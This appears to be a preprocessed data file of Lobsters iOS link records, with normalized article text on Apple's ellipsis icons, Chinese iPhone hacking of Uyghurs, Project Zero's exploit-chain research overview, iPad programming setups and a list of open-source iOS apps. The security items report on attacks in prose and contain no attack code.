113,Lobsters,ios,Apple iOS,Less‚Ä¶ Is More? Apple‚Äôs Inconsistent Ellipsis Icons Inspire User Confusion,https://tidbits.com/2019/08/30/less-is-more-apples-inconsistent-ellipses-icons-inspire-user-confusion/,apple inconsistent ellipsis icon inspire user confusion,get apple card benefit wikipedia suggests apple use abuse ellipsis iso standard symbol sf symbol google rescue material design,exploring io write justreleased take control io ipados become concerned seems increasingly frequent pattern io software design finally pushed edge writing article documenting apple card user interface wallet see get apple card benefit august found typing character right talking increasingly everpresent ellipsis button io technically generally render userinterface ellipsis running text three bullet make easily seen grudge ellipsis perfectly valid character writer use interesting flexible way formal usage probably indication intentional omission word sentence section larger body text instance apple insert ellipsis file name long display allocated space ellipsis also come used indicate wikipedia suggests unfinished thought leading statement slight pause echoing voice nervous awkward silence placed beginning end sentence ellipsis also inspire feeling melancholy longing technology could subtle writing macintosh interface ellipsis long specific meaning ellipsis following menu item mean choosing item result dialog rather action performed immediately choosing file save save current document choosing file save display save dialog enter new name location file technical writing drop ellipsis referring menu item avoid confusion traditional us ellipsis even mac started using ellipsis random way muddy meaning let take look apple use abuse ellipsis first let return wallet app tap ellipsis button access information credit card setting example ellipsis button akin choosing file get info mac open get info window display metadata selected file interestingly wallet recently switched using ellipsis button relied button looked like lowercase letter perhaps awkward localizing interface language script system iso standard symbol let say switch music app play tune playing song see yet another ellipsis button might assume tapping would display information song perhaps like see itunes choose edit song info ellipsis button io music app brings list trackspecific action like adding library adding playlist creating apple music station based least add playlist share song menu command honor standard use ellipsis indicate dialog appear next switched ellipsis button indicating tapping provide information setting acting contextual menu action perform selected song jump speaking soontobedefunct itunes go way top ellipsis usage especially browsing music artist many ellipsis two different excessive least apple us consistently clicking ellipsis button display contextual menu given item visually interface mess unfortunately similar music app current beta macos catalina speaking beta io beta presumably reflects apple recent design thinking since apple beta testing io io visual interface likely locked like get head start io experience check take control io ipados io tweaked ellipsis button music particularly helpful way first apple changed position importantly tapping open activity view instead action sheet io used interface language ellipsis open activity view action sheet may seem like small difference time interface something unexpected user lose trust ability interface confusion extend file app io well much like wallet apple replaced perfectly understandable edit link ellipsis button time setting perhaps sharing option time offer command scanning document connecting server option edit location favorite tag different action edit command make sense manipulating list item underneath new feature connecting server fit well scanning document nothing else file relates creating document perhaps favorite abuse ellipsis button io shortcut app tapping shortcut take shortcut action tapping viewing shortcut action take shortcut setting although sheet labeled detail first instance ellipsis button mean edit whereas second mean setting step back io shortcut app us distinct setting icon toggle switch shortcut setting apple replace visually clear icon generic one exactly ellipsis button io become generic icon indicate something see never know could replace ellipsis clarus dogcow would every bit visually clear interesting make matter worse example ellipsis button trigger different sort interface sometimes get separate screen sometimes action sheet sometimes activity view disorienting consistent behavior left right ellipsis button invoking screen shortcut action sheet file activity view music course yet another completely different context ellipsis incoming message indicator message try tapping happen unfortunately apple bad practice infected thirdparty developer well check example slack io app ellipsis button single view file option put view file button next button might thinking obvious ellipsis button icon simply mean way know sure good news apple introduced standard library icon upcoming operating system called sf symbol developer create icon borrow third party unfortunately description generally document icon look like meant mean name give developer idea use icon look like already obvious sf symbol standard unicode font way tech writer use documenting mac io apps worse apple license seemingly prevents use documentation anyway saying use symbol obtained apple sf font limited creating mockups user interface software product running apple io macos tvos operating system name like ellipsesbubble ellipsiscircle helpful interestingly apple describe specific icon used company icon developer allowed use indicate specific apple feature developer user sure icloud icon refer apple icloud service good luck deciphering ellipsiscircle mean maybe mean maybe apple intentionally vague broader issue term usability philosophical issue practical issue mean user saw example tapping ellipsis button activate widely varied range user interface element unlike say share icon consistently present activity view contains sharingrelated option behavior ellipsis button predictable consistent lead user confusion confuses spent year documenting io let examine competing approach representing google rescue believe google might outdone apple design google give developer clear design standard called material design come color palette template icon google opensource icon clearly state purpose part material design name icon based look like instead function represent unlike apple google call gear icon gear instead named setting indicate tapping provide access setting material design also provides array setting icon different thing like bluetooth brightness fair material design also includes ellipsis button though put name indicate tapping provide something let look google us ellipsis button io apps gmail share itunes annoying tendency nest ellipsis button like itunes us internally consistent way tap ellipsis button associated email thread bring menu thread tap ellipsis button associated message bring menu specific message itunes pretty consistent work ellipsis button vertical time presumably take le horizontal space video title work way youtube tap see menu extra action much like gmail provides difference action icon left would nice gmail gmail menu pop bottom screen thankfully nesting google doc ellipsis work much way tap reveal menu hidden action file view menu pop bottom like gmail youtube tapping ellipsis button viewing document cause menu pop side screen given length menu small inconsistency make sense help think hamburger button material design call menu button google apps use well applevel menu option would appropriate google map break convention somewhat tapping explore nearby pane open fullpage menu place category entirely fair comparison ellipsis button look like ellipsis match nearby colored icon provides text label like particular usage intuit happen tap clearly labeled button course prefer subjective choice android developer including google follow material design guideline exactly however think google usage ellipsis button clearer consistent apple disappointing apple supposedly leader interface design resorted uninspiring dare say lazy design icon claim usability expert seems icon represent clear intention followed consistent action quote apple human interface guideline consistent app implement familiar standard paradigm using systemprovided interface element wellknown icon standard text style uniform terminology app incorporates feature behavior way people expect ellipsis button may systemprovided even apple using initiate app function way people expect
114,Lobsters,ios,Apple iOS,Sources say China used iPhone hacks to target Uyghur Muslims,https://techcrunch.com/2019/08/31/china-google-iphone-uyghur/,source say china used iphone hack target uyghur muslim,hack iphones united nation google recently disclosed apple fixed vulnerability google said confirmed reporting tactic bombshell report,number malicious website used hack iphones twoyear period targeting uyghur muslim techcrunch learned source familiar matter said website part statebacked attack likely china designed target uyghur community country xinjiang state part latest effort chinese government crack minority muslim community recent history past year beijing detained million uyghurs internment camp according united nation human right committee google security researcher found recently disclosed malicious website week known targeting website part campaign target religious group infecting iphone malicious code simply visiting boobytrapped web page gaining unfettered access iphone software attacker could read victim message password track location nearreal time apple fixed vulnerability february io day google privately disclosed flaw news hacking campaign first disclosed week website thousand visitor per week least two year google said published forbes confirmed reporting said website targeting iphones also used target android window user suggests campaign targeting uyghurs far broader scope google initially disclosed victim tricked opening link opened would load one malicious website used infect victim common tactic target phone owner spyware one source told techcrunch website also infected nonuygurs inadvertently accessed domain indexed google search prompting fbi alert google ask site removed index prevent infection google spokesperson would comment beyond published research fbi spokesperson said could neither confirm deny investigation comment google faced criticism following bombshell report releasing website used attack researcher said attack indiscriminate watering hole attack target discrimination noting anyone visiting site would iphone hacked company would say behind attack apple comment email requesting comment chinese consulate new york unreturned updated additional information forbes following initial report
115,Lobsters,ios,Apple iOS,A very deep dive into iOS Exploit chains found in the wild,https://googleprojectzero.blogspot.com/2019/08/a-very-deep-dive-into-ios-exploit.html,deep dive io exploit chain found wild,,posted ian beer project zero project zero mission make hard often work company find report security vulnerability ultimate goal advocating structural security improvement popular system help protect people everywhere earlier year google threat analysis group tag discovered small collection hacked website hacked site used indiscriminate watering hole attack visitor using iphone target discrimination simply visiting hacked site enough exploit server attack device successful install monitoring implant estimate site receive thousand visitor per week tag able collect five separate complete unique iphone exploit chain covering almost every version io latest version io indicated group making sustained effort hack user iphones certain community period least two year investigate ass root cause vulnerability discus insight gain apple software development lifecycle root cause highlight novel often overlooked see case code seems never worked code likely skipped qa likely little testing review shipped user working tag discovered exploit total fourteen vulnerability across five exploit chain seven iphone web browser five kernel two separate sandbox escape initial analysis indicated least one privilege escalation chain still unpatched time discovery reported issue apple deadline feb resulted outofband release io feb also shared complete detail apple disclosed publicly feb several month careful analysis almost every byte every one exploit chain ready share insight realworld working campaign exploiting iphones en masse post include detailed writeups five privilege escalation exploit chain teardown implant used including demo implant running device talking reverseengineered command control server demonstrating capability implant steal private data like imessages photo gps location realtime analysis fellow team member samuel gro√ü browser exploit used initial entry point let also keep mind failure case attacker one campaign seen almost certainly others yet seen real user make risk decision based public perception security device reality remains security protection never eliminate risk attack targeted targeted might mean simply born certain geographic region part certain ethnic group user conscious fact mass exploitation still exists behave accordingly treating mobile device integral modern life yet also device compromised upload every action database potentially used hope guide general discussion around exploitation away focus million dollar dissident towards discussion marginal cost monitoring potential future dissident sha nt get discussion whether exploit cost million million million instead suggest price tag seem low capability target monitor private activity entire population real time recommend post read following order
116,Lobsters,ios,Apple iOS,Programming on an iPad,https://programmingzen.com/programming-on-an-ipad/,programming ipad,list gadget ipad useful ideal use case possible ipad setup programming pythonista digitalocean blink shell get stuff like,month ago wrote list gadget love mentioned gave old ipad wife use enough justify keeping yet conceded appeal newer ipads saying never owning ipad newer fancy model pencil cast certain spell still reached point gadget added collection get used get ipad find workflow make necessity fear seed planted started asking said workflow might look like ipad useful ipads tend great consumption device lightweight easy transport fast thanks great spec tight integration operating system battery life last day watching video casual browsing playing game quite convenient hate consumption trying focus production consumption life ipad hold great appeal solely considered consumption device recent time seen people use productive however doctor medical student appear quite fond domainspecific apps well notetaking capability digital artist create great painting drawing musician even photographersvideographers increasingly using ipad particularly pro line go could ipad great option programming well ideal use case discus one might configure ipad programming like point primary use would reading technical pdfs annotating taking note interested programming laptop superior choice still sitting library coffee shop reading programming book jotting note natural want write code validate experiment learning know neuroscience study act taking note hand superior typing come retaining information programming related material however say writing actual code important could bring laptop ipad becomes quite inconvenient point ideal scenario would ipad allows read technical book annotate themtake note program already excels first two task ipad work programming screen landscape mode certainly big enough opt model essentially different current macbook pro specwise might even fast faster really matter software baby called ifortknox quite locked possible ipad setup programming search find occasional ide io pythonista io example mostly work writing python script unfortunately equivalent elixir phoenix tend favor day plus like use git mechanism share code different laptop vnc great option either experience face quite bit lag smaller screen ipad lend well showing whole computer desktop seems best approach development environment remote machine use ipad client amusingly dedicated service like amazon support mobile browser well though upcoming ipad o defaulting safari full browser possible become viable option based research promising alternative running cheap remote box digitalocean similar provider connecting via moshshell like blink shell appears work really well even spotty connection would mean using terminalbased editor everybody even though tend use visual studio code day would zero problem using vim purpose hello vim old friend come type caveat aside really see downside workflow get benefit ipad brings plus ability actually real programming cover keyboard course new ipad pro rumored come soon might announced le two week going sit tight one eagerly waiting ipad use programming workflow different one propose let know comment get stuff like subscribe mailing list receive similar update programming thank subscribing please check email confirm subscription something went wrong related
117,Lobsters,ios,Apple iOS,Collaborative List of Open-Source iOS Apps,https://github.com/dkhamsing/open-source-ios-apps,collaborative list opensource io apps,opensource io apps contribution website apple tv back top hexclock icook tv moonlight game streaming news api apps octopus provenance railscasts http railscastscom retro skate stepik http stepikorg telemattvos uitzendinggemist uitzendinggemist jeffkreeftmeijer upcoming movie wwdctv apple watch back top alarm ball answer apollo applewatchfaces baidufm bither bus today calculator balestrapatrick cortado count done giovanni github contribution heartcontrol heartrate http imgurcomaxvqqj hn reader ktpomodoro myweight history natural language clock nightguard http wwwnightscoutinfo party wwdc photowatch safetimer spritekitwatchface summon termiwatch try swift nyc watch clicker presentation watchkit tutorial watchpics waterminder browser back top brave private web browser chrome http firefox firefox focus frameless ghostery privacy browser http wwwghosterycommobile onion browser http onionbrowsercom snowhaze calculator back top calendar back top color back top clock back top clone back top czinstagram finance flappy flybird flappyswift graygram legendwings messenger clone palettefromimage http earthviewwithgooglecom pinterest podcasts snake classic swiftagram swiftenstein swiftsnake trello voice memo youtube clone youtubeios communication back top afone apprtc blemeshchat chat chatsecure chaty colloquy deltachat element http elementio falcon messenger irccloud jami http jaminet linphone mattermost mchat messenger messenger clone monal mumble protonmail http protonmailcom quick chat realtime chat rocketchat session signal spika http spikabusiness surespot telegram tinode tswechat tutanota http tutanotacom vapor chat wire developer back top applove awesome ml baseconverter bitrise http wwwbitriseio buglife charter http circlecicom codebucket dash http kapelicomdashios devswitch escapey evolution expo client http expoio haptic harbour iosappsinfo iperf ish http ishapp ivim jasonette http jasonettecom knil knuff ladybug major input matomo nwpusher pastebin mobile http pastebincom pisth http pisthgithubio realmvideo retriever review time reviewmonitor savanna terrarium tldr man page tl inspector unwrap http wwwhackingwithswiftcom http wwwhackingwithswiftcom wwdcast zeplin Ëä±ÁÅ∞ http github back top codehub http codehubappcom contribution github evolution githawk githubswift githubsearch gitify gitiny gitpoint igit monkey mrcode octopodium pocket trailer rkgist siesta github browser swifthub terminal back top education back top ciao conjugar delta math helper discussit fingerspelling go flashcard gradecalc gpa calculator igrades kotoba first memory pocket code http wwwcatrobatorg population clock prayer english recast stepik http stepikorg transcription helper http novinfardcom ulangi wanikani http wwwwanikanicom wwdcast emulator back top activegs dospad iamiga iuae ish http ishapp mini vmac http namedforknetminivmac ppsspp provenance retroarch event back top eventblankapp iosdcrc meetuporganizer nortal techday northern california cherry blossom festival http sfcherryblossomorg open event organizer openstack foundation summit party wwdc rwdevcon try swift nyc try swift tokyo wwdc family io wwdc family react native extension back top content blocking back top today back top bus today contribution github daylight fojusi github contribution widget lunarcore news api apps openit timeline http timelinesapp vpn file back top amahi cozy drive http cozyioen fileexplorer nextcloud http nextcloudcom owncloud seafile pro http wwwseafilecomenhome finance back top argent boardbank http wwwrichardneitzkecom buck tracker divrise econoapp emi calculator encryptr http spideroakcomencryptr exchanger gasoline moneyplus stock neverlate sip calculator smart wallet http novinfardcom tip calculator tothepenny cryptocurrency back top alphawallet eth wallet http alphawalletcom bither bitprice bread essentia exa wallet monero http walletexantech trust http trustwalletcom unstoppable wallet wei wallet game back top swiftui aeropack arbusters associationbot canabalt cardsagainst castle hassle codecombat concentration game ÁøªÁøªÁúã conway game life vie cookiecrunch doom classic doom classic dragon shout app dropcolour dungeon crawl http githubcomcliffsdovercrawltreeiosrelease fityit flappy flybird flappy royale flappybird clone scary flight flappyswift frogatto friend http frogattocom frotz http githubcomifrotziosfrotzblobwikifrotzmainmd game war clone gravity block green mahjong hedgewars http wwwhedgewarsorg hostile takeover legendwings littlego lumines remake master matchimalsfun mechahamster memory game moonlight game streaming mudrammer first memory neocom eve online octopus oh plane pizzaman ragnarok scpasylumfail sansumoku http wwwsansumokucom savethedot sf symbol game shmup http fabiensanglardnetshmup skeleton key spare part teh internet tic tai toe ultimate peg solitaire http wwwultimatepegsolitairecom wolfenstein http back top spritekit http developerapplecomreferencespritekit back top crossesnous fityit five row ‰∫îÂ≠êÊ£ã flappy flybird gamejam mergel oh plane sakura fly snake classic stickheroswift swiftsnake health back top arex corona tracker http coronatrackersamaboxcom corona virus tracker corona virus tracker advice coronavirus iran coronavirustrackerflutter swiftui demo covidcheck depressed gleam glucosio good spirit healthkitswift hidrate medkeeper myweight history nightguard http wwwnightscoutinfo open food fact suicide safety plan contact tracing back top australia covidsafe austria stopp corona bulgaria virusafe canada covid alert czech republic erou≈°ka http erouskacz france stopcovid http wwweconomiegouvfrstopcovid germany corona warn app haiti guam puerto rico wyoming pathcheck safeplaces iceland http wwwcovidisappis israel hamagen italy immuni http wwwcovidisappis netherlands notification poland protego safe slovenia covid world switzerland swisscovid contact tracing reference back top exposurenotificationapp opencovidtrace traceprivately fitness back top researchkit http wwwapplecomresearchkit back top home back top location back top aircheck arc bike compass cepp crimemapper http samwoolfnet eatnow emission http emissioneecsberkeleyedu home find bus nj geolicious geotappy gps stone grove hopperbus ipokego landmark mapsme http mapsme miataru http miatarucomios move neverlate onebusaway openstreetview osmand map http osmandnet owntracks parkendd pebciti prey http preyprojectcom prey http preyprojectcom sit ÈõïÂàªÊó∂ÂÖâ santa tracker startup mapped israel tpg offline traccar client traccar manager wheelmap http wheelmaporg medium back top ascii art generator comicflow facemotion filterpedia inkpad kodi http kodiwikiviewios kodi remote http koditv marvel comic meme maker mupdf http mupdfcom myanimelist pdf keynote pictograph selfie stick swiftspace transcription helper http novinfardcom upcoming tv wallabag animoji back top audio back top analog synth x http audiokitioexamplesanalogsynthx audiokit rom player http audiokitprocomromplayercode audiokitsynthone http audiokitprocomsynth http audiokitprocomsynth bookplayer concertino doubanfm formant plotter miamisunglasses monotone delay http monotonejustuskandzicom newsanalyzer podcasts podverse http podversefm prodigal music player queue music http wwwqueuedappcom radio paradise http wwwradioparadisecom http wwwiltofacomrphd swift radio pro voicememos youtag content back top artshredder http martysuzukigithubioartshredder artsy artsy folio bar bringmyownbeer dunk fastmdb ghibliii homepok irisios kiwix http wikikiwixorgwikimainpage konabot http konachannet library genesis http libgenis lidderbuchapp molecule movieapp moviedict http moviedictinfo movie movieswiftui osia osrsui papersswiftui papr http unsplashcom phishod photobrowser phphub http learnkucomlaravel popcorntime popular movie reading list realmvideo revill showio http madyanovcomshowioen soundcloudswift swiftuimoviedb tvtoday word wwdc student xkcd xkcd open source gif http giphycom back top photo back top artshredder http martysuzukigithubioartshredder blear colorblur emotionnote diary frame grabber iosdepthsampler kontax cam megabite metax phimpme pixpic screenshotter seefood sharedimages tagger triggy upupu vk photo weare video back top news back top beam designer news http wwwdesignernewsco lobsterapp http lobster lobstersreader reddift redditswiftui slide reddit swipeit tabdump oakland post http zeitsuche hacker news http newsycombinatorcom back top news api http newsapiorg back top swiftui demo dailyfeed dailynews fancynews flutter news app livenewsviper news news api apps newsapiapp newsapiswift newsappwithswiftuiandcombine newsline royal news r back top official back top chrome http coding duckduckgo firefox ghostery privacy browser http wwwghosterycommobile kickstarter kodi http kodiwikiviewios kodi remote http koditv nextcloud http nextcloudcom nextcloud talk http nextcloudcom northern california cherry blossom festival http sfcherryblossomorg osia radio paradise http wwwradioparadisecom http wwwiltofacomrphd scholar wwdc simplenote http simplenotecom vlc http wwwvideolanorg wikipedia wire wordpress reactive programming back top reactivecocoa http githubcomreactivecocoareactivecocoa back top arex brewmobile coding giraffe reactiveswiftflickrsearch simpleauth tropos weather rxswift http githubcomreactivexrxswift back top baby monitor count drrrible github api client gitiny kiosk papr http unsplashcom podcasts rxcurrency rxmarbles rxswift mvvm example using github search rxtodo spotifyradar swifthub tweetometer wwdcast sample back top day react native demo mini swift apps selfstudy apple developer library apple wwdc arkit example artist cannonball castvideos cleanstore cloudkit cloudkit compositionallayoutskit contactsmvpswift face landmark detection grdbcombine iosdesignpatternsamples iosswiftmetalcamera knock layerparse layerplayer live mvctodo poll protocoloriented mvvm example recording http wwwobjciobooksapparchitecture reminder restaurant viewing rkgist safariautologintest http siesta github browser siri shortcut example snowflake staterestorationdemo swiftdemos tictactoe scan back top security back top dnscloak easy diceware icepa keyacid keybase krypton lockdown http lockdownhqcom outline http getoutlineorgenhome passepartout pgpro http pgproapp prey http preyprojectcom prey http preyprojectcom protonmail http protonmailcom simplelogin http simpleloginio tofu authenticator tutanota http tutanotacom vpn wireguard password back top authenticator http mattrubinmeauthenticator bitwarden http bitwardencom einmal encryptr http spideroakcomencryptr freeotp authenticator keepassium http keepassiumcom masterpassword minikeepass padlock http padlocapp pas http wwwpasswordstoreorg http mssungithubiopassforios passdrop raivo otp strongbox http strongboxsafecom shopping back top good living guide home snack gift beauty shopping mojilist openshopio wave jeep marketplace woocommerce social back top aozora ello mamoot peggsite post manager potter pic queue music http wwwqueuedappcom spotifyradar tweetledumb mastodon http joinmastodonorg back top task back top ecortex firetodo habitica http habiticacomstatichome planc realmtodo swiftuitodo tinylog todo viperswift text back top note back top fsnotes joplin http joplinapporg jotify loose leaf majorkey simplememo simplenote http simplenotecom standard note thoughtless timer back top travel back top californication conjugar flight search metrictime smart traveller uberguide themoji http themojime tourism demo travel guide visitbcn weather back top lucid weather clock nearbyweather newsappwithswiftuiandcombine pocket forecast simpleweather smileweather sol swiftlanguageweather temperatureatlas tropos weather yocelsius misc back top call altstore http altstoreio blogquest bookstoreios http itbookstore borrowed book carddecks clip cutthenotch deckrocket emoncms fakefbwall fontcase forcesketch freerdp http wwwfreerdpcom hackfoldr http hackfoldrorg icopypasta ladybug libreoffice remote impress libreoffice location lost madbike http wwwmadbikeappcom mirror octopod ooniprobe phonetic plumometer recipe remote say name science journal slidden susi ai triangledraw http wwwtriangledrawcom vinylogue appcelerator back top core data back top firebase http firebasegooglecom back top californication chaty falcon messenger howmuch messenger potter pic quick chat quickstart sample realtime chat flutter http flutterdev back top cinereel coronavirustrackerflutter flight search flutter news app fluttermovie browse movie gmail clone grocery shopping invoice ninja http wwwinvoiceninjacom newsline spacex go tourism demo travel guide ionic http ionicframeworkcom back top macos back top bikeshare corona tracker http coronatrackersamaboxcom delta math helper fruta hacker news multiplatform mamoot mean milestone movieswiftui redditswiftui stackov parse http enwikipediaorgwikiparse company back top react native http facebookgithubioreactnative back top day react native demo ar cut paste artist artsy assembly bp passport simple patient bristol pound b√≠√≥h√∫si√∞ calculator canada covid alert den dribbble finance gitify gitpoint haiti guam puerto rico wyoming pathcheck safeplaces iceland http wwwcovidisappis israel hamagen itunes catalog search jitsi meet keybase matchimalsfun mattermost moonwalk movement watch tracker movieapp nba allyoop nbareact newswatch nortal techday pokedb pokemonmap pokevision property finder react native hacker news reviewery rntester royal news r reader snowflake list list redux twitch weather jakelin weather jsphkhan http githubcomjsphkhanreactnativeexamplestreemasteriosweatherapp wwdc family react native realm http realmio back top done element http elementio facemotion howmuch test app obƒõd√°≈ô popular movie raceme realmtodo santa tracker try swift nyc try swift tokyo swiftui back top swiftui ac helper accountbook anitime asetimerswiftui astronomy picture day apod beer http punkapicom bikeshare blogidealistswiftui carbode barcode scanner corona virus tracker advice swiftui demo currency converter divrise dub dub todo list emitron http wwwraywenderlichcom expense tracker fingerspelling firetodo freetimepicker fruta ftc scorer skystone githubsearchwithswiftui,opensource io apps collaborative list opensource io ipados watchos tvos apps contribution welcome project website jump star star star star star project english click show detail apple tv back top hexclock minimal hexadecimal clock app store swift added june license screenshot icook tv taiwanese cuisine cooking video swift added may license mit screenshot moonlight game streaming app store c ipad added may license screenshot news api apps news app style nyt cnn bbc reddit twitter facebook includes tvos app today widget swift tvos extension added april license mit screenshot screenshot screenshot octopus remake nintendo octopus game watch device swift added may license screenshot provenance emulator frontend sega genesis snes ne gbgbc realm added april license screenshot screenshot railscasts ruby rail screencasts http railscastscom objc added may license screenshot retro skate swift added april license screenshot stepik take open course http stepikorg app store swift ipad alamofire swiftyjson sdwebimage devicekit promisekit swiftlint added may license screenshot telemattvos stream german public broadcast tv objc added may license screenshot uitzendinggemist uitgebreide uitzendinggemist app voor nederland swift added november license screenshot uitzendinggemist jeffkreeftmeijer dutch public broadcasting video demand swift added november license mit screenshot upcoming movie swift themoviedb added july license mit screenshot wwdctv watch wwdc video objc added november license screenshot apple watch back top alarm app store swift added april license screenshot ball answer app store swift watchos added july license mit screenshot apollo spotify player watchos swift added april license mit applewatchfaces create face watchos swift spritekit added january license screenshot baidufm baidu music swift added august license screenshot bither simple secure bitcoin wallet objc added april license screenshot screenshot screenshot screenshot bus today track bus line wrist includes today extension app store objc added february license screenshot screenshot screenshot screenshot screenshot calculator balestrapatrick objc added march license screenshot cortado track caffeine consumption habit objc added june license mit screenshot screenshot count dead simple way count anything swift added july license mit screenshot screenshot screenshot screenshot done todo list data sharing extension main app swift realm watchkit added may license mit screenshot giovanni gameboy emulator apple watch swift added march license screenshot github contribution track github contribution swift added april license screenshot heartcontrol continuous heart rate measurement workout swift added august license screenshot screenshot screenshot heartrate show streaming heart rate watch swift http imgurcomaxvqqj added july license screenshot hn reader hacker news reader app store swift added january license screenshot ktpomodoro mini pomodoro timer objc added february license screenshot myweight history body mass tracker easy data input access history app store swift added june license mit screenshot natural language clock display time would speak swift added april license mit screenshot nightguard display blood glucose value stored nightscout server swift applewatch http wwwnightscoutinfo added june license screenshot screenshot screenshot screenshot screenshot party wwdc swift cloudkit added january license mit screenshot screenshot photowatch us swiftydropbox sdk swift added february license mit screenshot safetimer control many hour use left kind tool supply equipment app store swift added june license screenshot spritekitwatchface spritekitbased faux analog watch face example watchos objc spritekit added november license screenshot summon summon another person exact location within building apple watch swift added september license screenshot termiwatch terminal face apple watch swift added april license mit screenshot try swift nyc swift toucan realm added november license screenshot screenshot watch clicker presentation control keynote using apple watch app store swift added march license screenshot watchkit tutorial swift added march license mit screenshot watchpics instagram objc added april license screenshot waterminder apple watch app remind drink water swift combine added june license mit screenshot browser back top brave private web browser lightning fast safe private preventing tracked ad app store swift added may license screenshot screenshot screenshot screenshot chrome objectivec http added february license screenshot screenshot screenshot firefox official firefox app app store swift carthage alamofire snapkit libphonenumber added january license screenshot screenshot screenshot screenshot screenshot firefox focus browse web privately app store swift added december license screenshot screenshot screenshot frameless fullscreen web browser swift added july license mit ghostery privacy browser private fast tracker adfree mobile browsing app store swift http wwwghosterycommobile added august license screenshot onion browser torpowered web browser improves privacy app store objc tor http onionbrowsercom added june license mit screenshot screenshot screenshot snowhaze powerful private browser developed protect data app store swift added may license screenshot screenshot screenshot screenshot calculator back top calendar back top color back top clock back top clone back top objc added march license mit screenshot swift added march license mit screenshot spritekit objc added july license mit screenshot czinstagram instagram written way eliminates massive view controller unidirectional eventstate flow manner swift mvvm flux sdwebimage easymapping added april license mit screenshot finance system stock app written react native react native added july license mit screenshot flappy flybird clone flappy bird using spritekit gameplaykit swift spritekit gameplaykit added july license screenshot screenshot screenshot screenshot screenshot flappyswift flappy bird clone swift added march license mit screenshot graygram instagram clone swift alamofire kingfisher added march license mit screenshot legendwings everwing game clone survive much earn gold upgradepurchase new character swift spritekit added april license screenshot screenshot screenshot screenshot messenger clone realtime chat swift firebase firestore added april license mit screenshot palettefromimage inspired http earthviewwithgooglecom swift palette color earthview added april license screenshot screenshot screenshot pinterest swift added may license screenshot podcasts clone apple podcasts swift rxswift added april license mit screenshot screenshot screenshot screenshot screenshot screenshot snake classic snake engine apple device swift added august license mit screenshot swiftagram instagram relies unofficial private apis swift added july license swiftenstein wolfenstein clone swift added may license mit screenshot swiftsnake snake clone swift added august license screenshot trello swift added may license mit voice memo swift added april license mit screenshot youtube clone youtube clone using mvc swift added november license youtubeios youtube app template swift added august license screenshot communication back top afone reference implementation sip telephony used different sip stack effort app store swift added august license mit screenshot screenshot screenshot screenshot screenshot apprtc native video chat app objc webrtc google added september license screenshot blemeshchat chat using bluetooth low energy api bluetooth le objc yapdatabase purelayout mantle bluetooth added january license screenshot screenshot chat swift added march license unlicense screenshot chatsecure send message otr encryption app store objc xmpp added march license screenshot screenshot screenshot screenshot chaty anonymous messaging realtime data sync swift firebase websocket nosql added may license mit screenshot colloquy irc client app store objc added january license screenshot screenshot screenshot screenshot deltachat emailbased instant messaging app store swift ipad added march license screenshot screenshot element secure decentralised chatvoip app store swift objc webrtc ipad cmark http elementio added july license screenshot falcon messenger fast beautiful cloudbased messaging app app store swift firebase added june license screenshot screenshot screenshot screenshot irccloud irc clientservice app store objc fastlane added january license screenshot screenshot screenshot screenshot jami decentralised text messaging video audio call file transfer video conferencing app store swift http jaminet added july license mit screenshot linphone free audiovideo call text messaging reachable time even app closed wifi cellular connection app store objc added august license screenshot screenshot screenshot screenshot mattermost secure messaging platform devops team app store reactnative added may license screenshot screenshot screenshot screenshot mchat realtime messaging app using firebase swift firebase lottie mapbox added april license screenshot messenger audiovideo call realtime chat full offline support objc firebase onesignal realm added july license screenshot screenshot messenger clone realtime chat swift firebase firestore added april license mit screenshot monal connect chat server without give third party access password message app store objc xmpp added november license screenshot screenshot screenshot mumble gamingfocused social voice chat utility app store objc fmdb added september license screenshot screenshot screenshot screenshot protonmail encrypted email app store swift iphone ipad dompurify afnetworking flanimatedimage http protonmailcom added june license screenshot screenshot screenshot screenshot quick chat realtime chat swift firebase added january license mit screenshot realtime chat firebase added november license screenshot rocketchat meteor chat platform app store swift added january license mit screenshot screenshot screenshot screenshot screenshot session private messenger app store swift objc promisekit sqlcipher mantle starscream afnetworking purelayout yyimage added may license screenshot signal free worldwide private messaging phone call app store objc iphone carthage socketrocket purelayout openssl added february license screenshot screenshot screenshot screenshot spika crossplatform messenger module afnetworking sdwebimage http spikabusiness added june license mit screenshot surespot secures message endtoend encryption app store objc added march license screenshot screenshot screenshot telegram send message focus speed security app store swift c objc added april license screenshot screenshot screenshot screenshot screenshot tinode cross platform messenger app store swift added may license screenshot screenshot tswechat wechat alternative swift added may license mit screenshot tutanota endtoend encrypted email app store javascript cordova iphone ipad http tutanotacom added june license screenshot screenshot screenshot screenshot vapor chat basic realtime chat project using vapor server swift starscream added september license screenshot wire modern private communication crystal clear voice video group chat always encrypted app store swift carthage afnetworking purelayout added july license screenshot developer back top applove view app review territory country swift added may license mit awesome ml discover download compile launch different image processing coreml model swift added april license screenshot baseconverter fast easy way convert number ton possibility app store swift ipad added august license screenshot screenshot screenshot bitrise client app bitriseio swift http wwwbitriseio added march license mit screenshot buglife awesome bug reporting sdk web platform objc added january license screenshot charter mailing list swift iphone ipad added february license screenshot http circlecicom app store swift added march license screenshot screenshot screenshot codebucket browse maintain bitbucket repository objc added june license screenshot screenshot screenshot screenshot screenshot dash instant offline access api documentation set app store objc iphone ipad kissxml dznemptydataset dtbonjour samkeychain http kapelicomdashios added november license screenshot screenshot devswitch switch country app store ease swift added april license mit escapey macos server io client app pair allow turn io device escape key come know love swift added october license mit screenshot screenshot evolution unofficial app swift evolution app store swift swiftevolution added april license mit screenshot screenshot screenshot screenshot screenshot expo client developer tool creating experience interactive gesture graphic app store reactnative javascript http expoio added april license screenshot haptic test learn implement haptic feedback app store added august screenshot harbour dockerportainer app swift docker swiftui ipad added april license screenshot iosappsinfo list installed apps url scheme objc added october license mit screenshot screenshot iperf run client including reverse mode multiple stream selection objc added november license screenshot ish linux shell io c objc http ishapp added march license screenshot screenshot ivim vim port app store c vimscript added february license screenshot jasonette create native app http json javascript http jasonettecom added november license mit screenshot knil universal link testing made easy app store added august screenshot knuff debug app apple push notification service app store swift pop apns added october license mit screenshot ladybug handle rdar link gracefully app store swift added july license mit screenshot screenshot screenshot major input read wwdc session transcript synced video swift ipad haneke quick nimble carthage swiftyjson added may license screenshot matomo access analytics go formerly piwik app store objc added june license screenshot screenshot screenshot screenshot screenshot nwpusher play apple push notification service objc apns added november license screenshot screenshot pastebin mobile quickly easily uploads text code http pastebincom swift added april license screenshot pisth ssh sftp client swift javascript html http pisthgithubio added january license screenshot realmvideo watch realm video slide swift iphone added may license mit screenshot retriever get infoplist without jailbreak objc added october license screenshot screenshot review time show average review time io mac apps swift added october license mit screenshot reviewmonitor itunes connect app 